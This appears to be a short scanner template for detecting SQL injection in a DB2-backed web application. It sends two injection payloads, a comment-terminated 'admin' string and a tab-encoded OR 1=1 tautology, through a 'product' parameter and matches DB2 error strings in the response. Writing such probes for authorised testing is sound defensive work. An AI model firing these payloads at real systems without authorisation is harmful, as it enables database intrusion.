id: sqli6-db2-18
name: 'SQLi db2 probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - 'admin"--'
        - '''%09OR%091=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
